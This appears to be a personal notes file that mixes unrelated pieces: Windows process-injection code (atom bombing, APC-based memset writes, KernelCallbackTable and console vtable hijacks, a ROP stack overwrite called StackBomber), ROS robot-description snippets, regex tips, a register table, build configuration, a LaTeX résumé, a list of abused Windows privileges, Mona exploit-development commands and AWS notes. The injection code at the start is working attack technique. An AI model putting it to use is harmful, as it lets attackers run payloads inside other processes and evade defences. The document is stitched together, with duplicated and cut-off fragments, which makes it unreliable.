ATOM aux = GlobalAddAtomA("b"); // arbitrary one char string
if (target_payload[0] == '\0')
{
printf("Invalid payload (starts with NUL)\n");
exit(0);
}
for (DWORD64 pos = sizeof(target_payload) - 1; pos > 0; pos--)
{
if ((payload[pos] == '\0') && (payload[pos - 1] == '\0'))
{
ntdll!NtQueueApcThread(th, GlobalGetAtomNameA, (PVOID)aux,
(PVOID)(((DWORD64)target_payload) + pos-1), (PVOID)2);
}
}
for (char* pos = payload; pos < (payload + sizeof(payload)); pos += strlen(pos)+1)
{
if (*pos == '\0')
{
continue;
}
ATOM a = GlobalAddAtomA(pos);
DWORD64 offset = pos - payload;
ntdll!NtQueueApcThread(th, GlobalGetAtomNameA, (PVOID)a,
(PVOID)(((DWORD64)target_payload) + offset), (PVOID)(strlen(pos)+1));
}



HANDLE fm = CreateFileMappingA(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE,
0, sizeof(payload), NULL);
LPVOID map_addr =MapViewOfFile(fm, FILE_MAP_ALL_ACCESS, 0, 0, 0);
HANDLE p = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE,
process_id);
memcpy(map_addr, payload, sizeof(payload));
LPVOID requested_target_payload=0;
SIZE_T view_size=0;
ntdll!NtMapViewOfSection(fm, p, &requested_target_payload, 0, sizeof(payload),
NULL, &view_size, ViewUnmap, 0, PAGE_EXECUTE_READWRITE );
target_payload=requested_target_payload;



MODULEINFO ntdll_info;
HANDLE ntdll= GetModuleHandleA("ntdll");
GetModuleInformation(GetCurrentProcess(), ntdll , &ntdll_info,
sizeof(ntdll_info));
HANDLE p = OpenProcess(PROCESS_VM_OPERATION, FALSE, process_id);
ntdll!NtUnmapViewOfSection(p, ntdll);
// Use write primitive to allocate ntdll_info.SizeOfImage bytes at address ntdll
in the target process,
// and write the patched ntdll code there.




MODULEINFO ntdll_info;
HANDLE ntdll= GetModuleHandleA("ntdll");
GetModuleInformation(GetCurrentProcess(), ntdll , &ntdll_info,
sizeof(ntdll_info));
HANDLE fm = CreateFileMappingA(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE,
0, ntdll_info.SizeOfImage, NULL);
LPVOID map_addr =MapViewOfFile(fm, FILE_MAP_ALL_ACCESS, 0, 0, 0);
HANDLE p = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_VM_OPERATION |
PROCESS_SUSPEND_RESUME, FALSE, process_id);
ntdll!NtSuspendProcess(p);
ReadProcessMemory(p, ntdll, map_addr, ntdll_info.SizeOfImage, NULL);
// Patch NtClose in map_addr
// …
ntdll!NtUnmapViewOfSection(p, ntdll);
SIZE_T view_size=0;
ntdll!NtMapViewOfSection(fm, p, &ntdll, 0, ntdll_info.SizeOfImage, NULL,
&view_size, ViewUnmap, 0, PAGE_EXECUTE_READWRITE );
FlushInstructionCache(p, ntdll, ntdll_info.SizeOfImage);
ntdll!NtResumeProcess(p);



GetWindowThreadProcessId(h, &process_id);
HWND hst = GetDlgItem(h, 303); // System Tray
HWND hc = GetDlgItem(hst, 1504);
HANDLE p = OpenProcess(PROCESS_ALL_ACCESS, FALSE, process_id);
char new_subclass[0x50];
HANDLE target_new_subclass = (HANDLE)VirtualAllocEx(p, NULL, sizeof(new_subclass),
MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
HANDLE old_subclass = GetProp(hc, "UxSubclassInfo"); //handle is the memory
address of the current subclass structure
ReadProcessMemory(p, (LPCVOID)old_subclass, (LPVOID)new_subclass,
sizeof(new_subclass), NULL);
DWORD64 target_execution_ptr_value=target_execution;
memcpy(new_subclass + 0x18, &target_execution_ptr_value,
sizeof(target_execution_ptr_value));
WriteProcessMemory(p, (LPVOID)(target_new_subclass), (LPVOID)new_subclass,
sizeof(new_subclass), NULL); // Or any other write memory primitive
SetProp(hc, "UxSubclassInfo", target_new_subclass);
PostMessage(hc, WM_KEYDOWN, VK_NUMPAD1, 0);
Sleep(1); // YMMV
SetProp(hc, "UxSubclassInfo", old_subclass);


HANDLE p = OpenProcess(PROCESS_QUERY_INFORMATION| PROCESS_VM_OPERATION|
PROCESS_VM_READ| PROCESS_VM_WRITE, FALSE, process_id);
PROCESS_BASIC_INFORMATION pbi;
ntdll!NtQueryInformationProcess(p,ProcessBasicInformation, &pbi, sizeof(pbi),
NULL);
PEB peb;
ReadProcessMemory(p, pbi.PebBaseAddress, &peb, sizeof(peb), NULL);
KERNELCALLBACKTABLE kct;
ReadProcessMemory(p, peb.KernelCallbackTable, &kct, sizeof(kct), NULL);
LPVOID target_payload = VirtualAllocEx(p, NULL, sizeof(payload),MEM_RESERVE |
MEM_COMMIT, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(p, target_payload, payload, sizeof(payload), NULL);
LPVOID target_kct = VirtualAllocEx(p, NULL, sizeof(kct), MEM_RESERVE | MEM_COMMIT,
PAGE_READWRITE);
kct.__fnCOPYDATA = (ULONG_PTR)target_payload;
WriteProcessMemory(p, target_kct, &kct, sizeof(kct), NULL);
WriteProcessMemory(p, (PBYTE)pbi.PebBaseAddress + offsetof(PEB,
KernelCallbackTable), &target_kct, sizeof(ULONG_PTR), NULL);
COPYDATASTRUCT cds;
cds.dwData = 1;
wchar_t msg[] = L"foo";
cds.cbData = lstrlenW(msg) * 2;
cds.lpData = msg;
SendMessage(hw, WM_COPYDATA, (WPARAM)hw, (LPARAM)&cds); // hw can be obtained via
e.g. EnumWindows
// Cleanup
WriteProcessMemory(p, (PBYTE)pbi.PebBaseAddress + offsetof(PEB,
KernelCallbackTable), &peb.KernelCallbackTable, sizeof(ULONG_PTR), NULL);


HANDLE h = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE,
process_id); // PROCESS_VM_OPERATION is required for RtlEncodeRemotePointer
void* encoded_addr = NULL;
ntdll!RtlEncodeRemotePointer(h, target_execution, &encoded_addr);
// Use any Memory Write Primitive here…
WriteProcessMemory(h, kernelbase!SingleHandler, &encoded_addr, 8, NULL);
INPUT ip;
ip.type = INPUT_KEYBOARD;
ip.ki.wScan = 0;
ip.ki.time = 0;
ip.ki.dwExtraInfo = 0;
ip.ki.wVk = VK_CONTROL;
ip.ki.dwFlags = 0; // 0 for key press
SendInput(1, &ip, sizeof(INPUT));
Sleep(100);
PostMessageA(hWindow, WM_KEYDOWN, 'C', 0); // hWind



Sleep(100);
ip.type = INPUT_KEYBOARD;
ip.ki.wScan = 0;
ip.ki.time = 0;
ip.ki.dwExtraInfo = 0;
ip.ki.wVk = VK_CONTROL;
ip.ki.dwFlags = KEYEVENTF_KEYUP;
SendInput(1, &ip, sizeof(INPUT));
// Restore the original Ctrl handler in the target process
ntdll!RtlEncodeRemotePointer(h, kernelbase!DefaultHandler, &encoded_addr);
// Use any Memory Write Primitive here…
WriteProcessMemory(h, kernelbase!SingleHandler, &encoded_addr, 8, NULL);



DWORD conhost_id = conhostId(process_id);
HANDLE hp = OpenProcess(PROCESS_VM_READ|PROCESS_VM_WRITE | PROCESS_VM_OPERATION,
FALSE, conhost_id);
LPVOID target_payload = VirtualAllocEx(hp, NULL, sizeof(payload), MEM_COMMIT |
MEM_RESERVE, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(hp, target_payload, payload, sizeof(payload), NULL);
LONG_PTR udptr = GetWindowLongPtr(hWindow, GWLP_USERDATA);
ULONG_PTR vTable;
ReadProcessMemory(hp, (LPVOID)udptr, (LPVOID)&vTable, sizeof(ULONG_PTR), NULL);
ConsoleWindow cw;
ReadProcessMemory(hp, (LPVOID)vTable, (LPVOID)&cw, sizeof(ConsoleWindow), NULL);
LPVOID target_cw = VirtualAllocEx(hp, NULL, sizeof(ConsoleWindow), MEM_COMMIT |
MEM_RESERVE, PAGE_READWRITE);
cw.GetWindowHandle = (ULONG_PTR)target_payload;
WriteProcessMemory(hp, target_cw, &cw, sizeof(ConsoleWindow), NULL);
WriteProcessMemory(hp, (LPVOID)udptr, &target_cw, sizeof(ULONG_PTR), NULL);
SendMessage(hWindow, WM_SETFOCUS, 0, 0);
WriteProcessMemory(hp, (LPVOID)udptr, &vTable, sizeof(ULONG_PTR), NULL);



HANDLE ntdll= GetModuleHandleA("ntdll");
HANDLE t = OpenThread(THREAD_SET_CONTEXT, FALSE, thread_id);
for (int i = 0; i < sizeof(payload); i++)
{
ntdll!NtQueueApcThread(t, GetProcAddress(ntdll, "memset"),
(void*)(target_payload+i), (void*)*(((BYTE*)payload)+i), 1);
}
// Can finish with the “atomic” ntdll!NtQueueApcThread(t, GetProcAddress(ntdll,
"memmove"), (void*)target_payload_final,
// (void*)target_payload,
sizeof(payload));




26. “StackBomber” write primitive and execution method (NEW! 2019)
Invented by Amit Klein, Itzik Kotler, Safebreach. NOTE: Yuki Chen anticipated stack overwrite as
an execution method in 2015 (https://www.blackhat.com/docs/eu-15/materials/eu-15-ChenHey-Man-Have-You-Forgotten-To-Initialize-Your-Memory.pdf), but he did not elaborate or
demonstrate, also he did not describe how to find and overwrite TOS safely, such that control is
passed to the payload without crashing the original function first.
Naïve (and using memset/APC as a writing technique):
a. Read RSP via GetThreadContext
b. Override stack data with new stack, via NtQueueUserAPC(ntdll!memset, thread,
destination,byte,1). Specifically, the return address stored on the stack is overwritten.
Execution will commence once the alertable function returns.
Note that the 5 alertable functions call NtXXX functions which are simple wrappers around
SYSCALL (SleepEx -> NtDelayExecution, WaitForSingleObjectEx -> NtWaitForSingleObject,
WaitForMultipleObjectsEx -> NtWaitForMultipleObjects, SignalObjectAndWait ->
NtSignalAndWaitForSingleObject, RealMsgWaitForMultipleObjectsEx ->
NtUserMsgWaitForMultipleObjectsEx). These five NtXXX functions use the following template:
mov r10,rcx
mov eax,SERVICE_DESCRIPTOR
test byte ptr [SharedUserData+0x308],1
jne +3
syscall
ret
int 2E
ret
So these functions don’t use the stack, therefore RSP ==TOS contains the return address, hence
we know exactly where to place the ROP chain.
We can generalize this – knowing RIP usually allows us to determine where the return address
is, relative to RSP. The above case becomes a special case wherein the return address offset


StackBomber

HANDLE ntdll= GetModuleHandleA("ntdll");
HANDLE t = OpenThread(THREAD_SET_CONTEXT | THREAD_GET_CONTEXT |
THREAD_SUSPEND_RESUME, FALSE, thread_id);
SuspendThread(t);
CONTEXT ctx;
ctx.ContextFlags = CONTEXT_ALL;
GetThreadContext(t, &ctx);
DWORD64 tos = (DWORD64)ctx.Rsp;
for (int i = 0; i < sizeof(ROP_chain); i++)
{
ntdll!NtQueueApcThread(t, GetProcAddress(ntdll, "memset"), (void*)(tos+i),
(void*)*(((BYTE*)ROP_chain)+i), 1);
}
ResumeThread(t);


Backup the current stack first (using memmove), then restore it and the registers. Note:
in order to accommodate the backup stack, the stack can be grown by writing a dummy
value every 4KB (allocating a new page each time).
• Alternatively, the stack can be read by the injector process, using a memory read
primitive (e.g. ReadProcessMemory), and embedded in the payload.
• Pivot to a new memory immediately – this ruins only the return address, and another
QWORD above it (which is anyway reserved for the leaf function and unused by the 5
leaf functions mentioned above, hence can be safely overwritten with no need for
restoration). The payload needs to restore RSP and the return address (only).
As for restoring registers, the 5 leaf functions do not rely on volatile registers when transferring
control to the kernel, and thus it is safe to modify the volatile registers, but the non-volatile
registers must be restored. Keep in mind that calling other (system) functions from the payload
does not modify the non-volatile registers since they are restored before control is returned to
the main payload. Thus, if the payload is written to only use volatile registers, it will be safe
(with no need to restore registers).
A safe version (including clean-up):
// payload mustn’t modify non-volatile registers, must copy the saved return
address to the original tos location (e.g. using memmove)
// and must restore rsp and control when it’s done, e.g. using GADGET_pivot.
HANDLE t = OpenThread(THREAD_SET_CONTEXT | THREAD_GET_CONTEXT |
THREAD_SUSPEND_RESUME, FALSE, thread_id);
SuspendThread(t);
CONTEXT context;
context.ContextFlags = CONTEXT_ALL;
GetThreadContext(t, &context)
DWORD64 orig_tos = (DWORD64)context.Rsp;
DWORD64 tos = orig_tos-0x2000; // 0x2000 experimentally works…
// Grow the stack to accommodate the new stack
for (DWORD64 i = orig_tos - 0x1000; i >= tos; i -= 0x1000)
{
(*NtQueueApcThread)(t, GetProcAddress(ntdll, "memset"), (void*)(i),
(void*)0, 1);
}
// Write the new stack
payload[saved_tos]=orig_tos;
for (int i = 0; i < sizeof(payload); i++)
{
(*NtQueueApcThread)(t, GetProcAddress(ntdll, "memset"), (void*)(tos + i),
(void*)*(((BYTE*)payload) + i), 1);
}
// Save the original return address into the new stack
(*NtQueueApcThread)(t, GetProcAddress(ntdll, "memmove"),
(void*)(payload[saved_return_address]), (void*)orig_tos, 8);
// overwrite the original return address with GADGET_pivot
for (int i = 0; i < sizeof(tos); i++)
{
(*NtQueueApcThread)(t, GetProcAddress(ntdll, "memset"), (void*)(orig_tos +
i), (void*)(((BYTE*)&GADGET_pivot)[i]), 1);
}
// overwrite the original tos+8 with the new tos address (we don't need to restore
this since it's shadow stack and not used by the leaf function!)
for (int i = 0; i < sizeof(tos); i++)
{
(*NtQueueApcThread)(t, GetProcAddress(ntdll, "memset"), (void*)(orig_tos +
8 + i), (void*)(((BYTE*)&tos)[i]), 1);
}
ResumeThread(t);




---------------------------------------------------------------------------------------------------------------------


ROS programming 
-----------------------

<?xml version="1.0"?> 
<robot name="pan_tilt"> 
  <link name="base_link"> 
    <visual> 
      <geometry> 
      <cylinder length="0.01" radius="0.2"/> 
      </geometry> 
      <origin rpy="0 0 0" xyz="0 0 0"/> 
	  <?xml version="1.0"?> 
<robot name="pan_tilt"> 
  <link name="base_link"> 
    <visual> 
      <geometry> 
      <cylinder length="0.01" radius="0.2"/> 
      </geometry> 
      <origin rpy="0 0 0" xyz="0 0 0"/> 
	  
	  
	  
	   <material name="yellow"> 
        <color rgba="1 1 0 1"/> 
      </material> 
    </visual> 
  </link> 
  <joint name="pan_joint" type="revolute"> 
    <parent link="base_link"/> 
    <child link="pan_link"/> 
    <origin xyz="0 0 0.1"/> 
    <axis xyz="0 0 1" /> 
  </joint> 
  <link name="pan_link"> 
    <visual> 
      <geometry> 
      <cylinder length="0.4" radius="0.04"/> 
      </geometry> 
      <origin rpy="0 0 0" xyz="0 0 0.09"/> 
      <material name="red"> 
        <color rgba="0 0 1 1"/> 
      </material> 
    </visual> 
  </link> 
  <joint name="tilt_joint" type="revolute"> 
    <parent link="pan_link"/> 
    <child link="tilt_link"/> 
    <origin xyz="0 0 0.2"/> 
    <axis xyz="0 1 0" /> 
  </joint> 
  <link name="tilt_link"> 
    <visual> 
      <geometry> 
  <cylinder length="0.4" radius="0.04"/> 
      </geometry> 
      <origin rpy="0 1.5 0" xyz="0 0 0"/> 
      <material name="green"> 
        <color rgba="1 0 0 1"/> 
      </material> 
    </visual> 
  </link> 
</robot>


check_urdf pan_tilt.urdf  

$ urdf_to_graphiz pan_tilt.urdf 

This command will generate two files: pan_tilt.gv and pan_tilt.pdf. We can view the structure of this robot using this command:$ evince pan_tilt.pdf  
We will get the following output:
evince pan_tilt.pdf 


<launch> 
  <arg name="model" /> 
  <param name="robot_description" textfile="$(find mastering_ros_robot_description_pkg)/urdf/pan_tilt.urdf" /> 
  <param name="use_gui" value="true"/> 
  <node name="joint_state_publisher" pkg="joint_state_publisher" type="joint_state_publisher" /> 
  <node name="robot_state_publisher" pkg="robot_state_publisher" type="state_publisher" /> 
  <node name="rviz" pkg="rviz" type="rviz" args="-d $(find mastering_ros_robot_description_pkg)/urdf.rviz" required="true" /> 
</launch> 

roslaunch mastering_ros_robot_description_pkg view_demo.launch  


<joint name="pan_joint" type="revolute"> 
    <parent link="base_link"/> 
    <child link="pan_link"/> 
    <origin xyz="0 0 0.1"/> 
    <axis xyz="0 0 1" /> 
    <limit effort="300" velocity="0.1" lower="-3.14" upper="3.14"/> 
    <dynamics damping="50" friction="1"/> 
  </joint>
  
  <link> 
......     
<collision> 
      <geometry> 
      <cylinder length="0.03" radius="0.2"/> 
      </geometry> 
      <origin rpy="0 0 0" xyz="0 0 0"/> 
    </collision> 
 
    <inertial> 
    <mass value="1"/> 
    <inertia ixx="1.0" ixy="0.0" ixz="0.0" iyy="1.0" iyz="0.0" izz="1.0"/> 
    </inertial> 
........... 
</link> 


<?xml version="1.0"?> 
<robot xmlns:xacro="http://www.ros.org/wiki/xacro" name="pan_tilt"> 

<xacro:property name="base_link_length" value="0.01" /> 
  <xacro:property name="base_link_radius" value="0.2" /> 
  <xacro:property name="pan_link_length" value="0.4" /> 
  <xacro:property name="pan_link_radius" value="0.04" /> 
We can use the value of the variable by replacing the hardcoded value with the following definition:  <cylinder length="${pan_link_length}" 
 radius="${pan_link_radius}"/> 
 
 
 
 
 
 
  
  
<cylinder length="${pan_link_length}" 
 radius="${pan_link_radius+0.02}"/
 
 
 
 
 
 
 
 
 
 
 A tip 
 --------------
 You can use the Visual Studio build in replacement (Ctrl + H) with an activate regex search.

Visual Studio RegEx Replace

As already shown in the image, use \/\/.*\n as expression and nothing as replacement. But as i  pointed out in the comments below: You have to be careful, because this regex also matches strings containing //.

If your inline comments are just single lines with /* some comment */ you can use \/\*.*\*\/.

And for matching single and multiline comments /* */ you can use \/\*(.*?\n?)*\*\/.
 
 
 For PCRE, and most other so-called Perl-compatible flavors, escape these outside character classes:

.^$*+?()[{\|
and these inside character classes:

^-]\
For POSIX extended regexes (ERE), escape these outside character classes (same as PCRE):

.^$*+?()[{\|
Escaping any other characters is an error with POSIX ERE.

Inside character classes, the backslash is a literal character in POSIX regular expressions. You cannot use it to escape anything. You have to use "clever placement" if you want to include character class metacharacters as literals. Put the ^ anywhere except at the start, the ] at the start, and the - at the start or the end of the character class to match these literally, e.g.:

[]^-]
In POSIX basic regular expressions (BRE), these are metacharacters that you need to escape to suppress their meaning:

.^$*[\
Escaping parentheses and curly brackets in BREs gives them the special meaning their unescaped versions have in EREs. Some implementations (e.g. GNU) also give special meaning to other characters when escaped, such as \? and +. Escaping a character other than .^$*(){} is normally an error with BREs.

Inside character classes, BREs follow the same rule as EREs.
 
 
 
 
 Escape the metacharacters like: .[{()\^$|?*+ - so searching for ? in the code should be done by \?
 
 
 
 
 Pwnlib
 ----------------
 
 +-----------------+---------------+---------------+------------+
| 8 Byte Register | Lower 4 Bytes | Lower 2 Bytes | Lower Byte |
+-----------------+---------------+---------------+------------+
|   rbp           |     ebp       |     bp        |     bpl    |
|   rsp           |     esp       |     sp        |     spl    |
|   rip           |     eip       |               |            |
|   rax           |     eax       |     ax        |     al     |
|   rbx           |     ebx       |     bx        |     bl     |
|   rcx           |     ecx       |     cx        |     cl     |
|   rdx           |     edx       |     dx        |     dl     |
|   rsi           |     esi       |     si        |     sil    |
|   rdi           |     edi       |     di        |     dil    |
|   r8            |     r8d       |     r8w       |     r8b    |
|   r9            |     r9d       |     r9w       |     r9b    |
|   r10           |     r10d      |     r10w      |     r10b   |
|   r11           |     r11d      |     r11w      |     r11b   |
|   r12           |     r12d      |     r12w      |     r12b   |
|   r13           |     r13d      |     r13w      |     r13b   |
|   r14           |     r14d      |     r14w      |     r14b   |
|   r15           |     r15d      |     r15w      |     r15b   |
+-----------------+---------------+---------------+------------+

rdi:    First Argument
rsi:    Second Argument
rdx:    Third Argument
rcx:    Fourth Argument
r8:     Fifth Argument
r9:     Sixth Argument


rbp: Base Pointer, points to the bottom of the current stack frame
rsp: Stack Pointer, points to the top of the current stack frame
rip: Instruction Pointer, points to the instruction to be executed

General Purpose Registers
These can be used for a variety of different things
rax:
rbx:
rcx:
rdx:
rsi:
rdi:
r8:
r9:
r10:
r11:
r12:
r13:
r14:
r15:



00:     Carry Flag
01:     always 1
02:     Parity Flag
03:     always 0
04:     Adjust Flag
05:     always 0
06:     Zero Flag
07:     Sign Flag
08:     Trap Flag
09:     Interruption Flag     
10:     Direction Flag
11:     Overflow Flag
12:     I/O Privilege Field lower bit
13:     I/O Privilege Field higher bit
14:     Nested Task Flag
15:     Resume Flag



objdump -D hello_world -M intel | less


check instruction here
https://www.masswerk.at/6502/6502_instruction_set.html




options:{
        module:'commonjs',
        target:'es2017', 
        basePath:'./src/static/ts/app',
        sourceMap: true,
        declaration: true
      }, 
      base :{
        src :['./src/static/*/*.ts'],
        dest: './_site/assets/js',
		
		
		npm install typescript@next
		----------------------------------------------------------------------------------------------------------------------------------
		module.exports = function(grunt) {
 // Project configuration.
 grunt.initConfig({
   pkg: grunt.file.readJSON('package.json'),
    connect: {
     uses_defaults: {}
   },
    sass: {
     dev: {
       options: { sourceMap: true },
       files: { 'sites/all/themes/uj/css/uj.styles.css' : 'sites/all/themes/uj/sass/uj.styles.scss' }     
    }
   },
   watch: {
    css: {
      files: 'sites/all/themes/uj/**/*.scss',
      tasks: [ 'sass:dev' ],
      options: { livereload: true }
 }
}



 });
 // Load Grunt plugins
// grunt.loadNpmTasks('');
 // Default task(s).
 grunt.registerTask('default', []);



// Load Grunt plugins
grunt.loadNpmTasks('grunt-contrib-connect');
grunt.loadNpmTasks('grunt-sass');
grunt.loadNpmTasks('grunt-contrib-watch');


};



extra


%-------------------------------------------------------------------------------
%	SECTION TITLE
%-------------------------------------------------------------------------------
\cvsection{Extracurricular Activity}


%-------------------------------------------------------------------------------
%	CONTENT
%-------------------------------------------------------------------------------
\begin{cventries}

%---------------------------------------------------------
  \cventry
    {Deep Learning Engineer} % Affiliation/role
    {Artificial Intelligence Professional (Internship on Interview ))} % Organization/group
    {Alliance Technology , Dubai , UAE      /Russia based Company } % Location
    {Aug. 2020 - Dec. 2020} % Date(s)
    {
      \begin{cvitems} % Description(s) of experience/contributions/knowledge
        \item {I was trained as a expert there , but I am more skeptical than any other scientific evangelist . I was not convinced that life science algorithm conducted with the existing research approaches at the current level of human civilization could be considered as “science” . That was part of the motivations which caused me to leave that field (Genetic root of Simple Programming that's how developed setup my interest in AI ). I should be grateful that I have learned mathematics and programming well in college, and I met machine learning when I was at the lowest point of my life.}
        \item {The research and engineering interests that I showcased with them are mainly in the areas of machine learning, artificial intelligence, general computer science, and user-friendly software engineering.  }
        \item{The company were persuaded with my performance as an intern , that was the time when we got an Opportunity to meet up at the address Expo for  Improved Intelligence on \textbf {Apple tech}}
      \end{cvitems}
    }

%---------------------------------------------------------
  \cventry
    {Cyber Team Operator (Security \&  processing field)} % Affiliation/role
    {ELV Alliance Technology (Cyber Wing) , Dubai , UAE      /Russia based Company} % Organization/group
    {Dubai, UAE} % Location
    {May. 2020 - July. 2020} % Date(s)
    {
      \begin{cvitems} % Description(s) of experience/contributions/knowledge
        \item {Content and course developer supporting Defense Threat Reduction Wing of the Company Emulated advanced persistent threats as a penetration tester with expertise in host and network exploitation.}
        \item {Assisted in the development of the cyber red team management Standard Operating Procedure documentation Developed " Strategies for Kernel Security and open Source intelligent Gathering techniques " for safety inspection.}
        \item {worked on Hosting a "Capture the Flag(CTF)" competition utilizing Docker but in between I had to drop it to plunge back to college to continue the rail .In interest of my previous internship with the company , they got me a specialized training on "Cisco Security Operations"}
        \item {Conducted penetration testing commissioned by national agency and corporation.}
      \end{cvitems}
    }

%---------------------------------------------------------
\end{cventries}


education
%-------------------------------------------------------------------------------
%	SECTION TITLE
%-------------------------------------------------------------------------------
\cvsection{Education}


%-------------------------------------------------------------------------------
%	CONTENT
%-------------------------------------------------------------------------------
\begin{cventries}

%---------------------------------------------------------
  \cventry
    {Btech Specialization in Gaming, AI} % Degree
    {VIT(Vellore Institute of Technology))} % Institution
    {Bhopal , Madhya Pradesh} % Location
    {April. 2018 - May. 2022} % Date(s)
    {
      \begin{cvitems} % Description(s) bullet points
        \item {“Computer security was self- taught, it was largely in terms of models for access control, and I think tended to focus more on the concept of securing multiple-user computer systems and users’ access to them being seen as more of an atomic model than as bits and pieces of a larger, more globally-interconnected system.. Some of the Knowledge came from reading standard computer science and engineering and reference tomes, and learning about computer and network operations, and some from … shall we say, unofficial and very hands-on experimentation,”.}
      \end{cvitems}
    }

%---------------------------------------------------------
\end{cventries}


committies

%-------------------------------------------------------------------------------
%	SECTION TITLE
%-------------------------------------------------------------------------------
\cvsection{Program Committees}


%-------------------------------------------------------------------------------
%	CONTENT
%-------------------------------------------------------------------------------
\begin{cvhonors}

%---------------------------------------------------------
  \cvhonor
    {Program Speaker} % Position
    {2020  GITEX  technology Meet (Cyber)} % Committee
    {Dubai , UAE} % Location
    {2020} % Date(s)

%---------------------------------------------------------
  \cvhonor
    {Organizer \& Co-director} % Position
    {Hackathon(Dockerized) for ELVAlliance, Dubai } % Committee
    {UAE} % Location
    {2020} % Date(s)

%---------------------------------------------------------
\end{cvhonors}


writing
%-------------------------------------------------------------------------------
%	SECTION TITLE
%-------------------------------------------------------------------------------
\cvsection{Writing}


%-------------------------------------------------------------------------------
%	CONTENT
%-------------------------------------------------------------------------------
\begin{cventries}

%---------------------------------------------------------
  \cventry
    {Team Operator \&  Instructor} % Role
    {A Guide to Open Blockchain Tech} % Title
    {Live at Expo Centre} % Location
    {Jan. 2021} % Date(s)
    {
      \begin{cvitems} % Description(s)
        \item {Drafted a Application Design for Coin trading using Java providing data collection and export, complex event processing and triggering, and backtesting}
      \end{cvitems}
    }

%---------------------------------------------------------
\end{cventries}


honors


%-------------------------------------------------------------------------------
%	SECTION TITLE
%-------------------------------------------------------------------------------
\cvsection{Honors \& Awards}


%-------------------------------------------------------------------------------
%	SUBSECTION TITLE
%-------------------------------------------------------------------------------
\cvsubsection{International}


%-------------------------------------------------------------------------------
%	CONTENT
%-------------------------------------------------------------------------------
\begin{cvhonors}

%---------------------------------------------------------


  \cvhonor
    {IABAC} % Award
    {Artificial Intelligence on business Development } % Event
    {IABAC  Certification Exam} % Location
    {2020} % Date(s)

	
%---------------------------------------------------------
%---------------------------------------------------------
  \cvhonor
    {Best Performer} % Award
    {Those Working Days at company } % Event
    {Dubai, U.A.E} % Location
    {2020} % Date(s)

%---------------------------------------------------------
  \cvhonor
    {Community Project} % Award
    {Open Coach Training NLP} % Event
    {Dubai, U.A.E} % Location
    {2019} % Date(s)

%---------------------------------------------------------
  \cvhonor
    {Pool Finalist} % Award
    {Boston CTF} % Event
    {Dubai ,  U.A.E} % Location
    {2019} % Date(s)

%---------------------------------------------------------
  \cvhonor
    {Finalist Creative Idea (Covid Planning)} % Award
    {Open Idea Contribution, Gsoc } % Event
    {Dubai, U.A.E} % Location
    {2019} % Date(s)

%---------------------------------------------------------
  \cvhonor
    {Creator} % Award
    { CUCA Scholarship} % Event
    {Dubai, U.A.E} % Location
    {2018} % Date(s)

%---------------------------------------------------------
\end{cvhonors}




summary
%-------------------------------------------------------------------------------
%	SECTION TITLE
%-------------------------------------------------------------------------------
\cvsection{Summary}


%-------------------------------------------------------------------------------
%	CONTENT
%-------------------------------------------------------------------------------
\begin{cvparagraph}

%---------------------------------------------------------
I am self-learner and working confident, curious, and perpetually. I have good experience in developing software platforms for real world problems, and I am working on several communities for improving the technical knowledge in the society. I have good leadership, organizing, and communication skills.

I am a perfectionist. I want to solve the problems in my hands in perfect ways, which is, however, not achievable in many situations. I also apply Bellman Equation in the optimization of my life, which is a Markov decision process, but the future discount factor γ in the equation might be small and I would often be trapped in local optimum.
\end{cvparagraph}



The privileges of an account(which are either given to the account when created or inherited from a group) allow a user to carry out particular actions. Here are the most commonly abused privileges:

SeImpersonatePrivilege
SeAssignPrimaryPrivilege
SeTcbPrivilege
SeBackupPrivilege
SeRestorePrivilege
SeCreateTokenPrivilege
SeLoadDriverPrivilege
SeTakeOwnershipPrivilege
SeDebugPrivilege






MONA commands
----------------------
a
!mona assemble  -s "pop eax#inc ebx#ret"
Log data
bf - breakpoint 
!mona bf -a {addr} -t Read
!mona bytearray -b '{array of bytes'
!mona compare -f bytearray.bin
!mona dump - s {addr} -e [addr] -f "file path"
egg
!mona filecompare -f "c:\temp\{path to txt file}"
!mona find -type asc -s "somethig"
!mona find -type instr - s "jmp ecx" -p2p -x X
!mona find -type file -s "{file path}" -p2p -x *
!mona bp -t READ -a {ADDR}
findmsp 
findwild
!mona fildwild -s "push jskdfhskhfkjshdkj"
getpc 
getiat
header
heap 
help
info 
j 
jump 
jop 
jseh 
modules
noaslr
nosafeseh 
 nosafesehaslr
 offset
 p 
 p1 
 p2
 pattern_create
pattern_offset
pc
po
rop 
ropfunc
seh 
stackvpivot
stacks
suggest 
skeleton 
metasploit


features of AWS  instances 
---------------------------------
Amazon EC2 instances provide a number of additional features to help you deploy, manage, and scale your applications.
Burstable Performance Instances
Amazon EC2 allows you to choose between Fixed Performance Instances (e.g. M5, C5, and R5) and Burstable Performance Instances (e.g. T3). Burstable Performance Instances provide a baseline level of CPU performance with the ability to burst above the baseline.

T Unlimited instances can sustain high CPU performance for as long as a workload needs it. For most general-purpose workloads, T Unlimited instances will provide ample performance without any additional charges. The hourly T instance price automatically covers all interim spikes in usage when the average CPU utilization of a T instance is at or less than the baseline over a 24-hour window. If the instance needs to run at higher CPU utilization for a prolonged period, it can do so at a flat additional charge of 5 cents per vCPU-hour.

T instances’ baseline performance and ability to burst are governed by CPU Credits. Each T instance receives CPU Credits continuously, the rate of which depends on the instance size. T instances accrue CPU Credits when they are idle, and use CPU credits when they are active. A CPU Credit provides the performance of a full CPU core for one minute.

For example, a t2.small instance receives credits continuously at a rate of 12 CPU Credits per hour. This capability provides baseline performance equivalent to 20% of a CPU core (20% x 60 mins = 12 mins). If the instance does not use the credits it receives, they are stored in its CPU Credit balance up to a maximum of 288 CPU Credits. When the t2.small instance needs to burst to more than 20% of a core, it draws from its CPU Credit balance to handle this surge automatically.

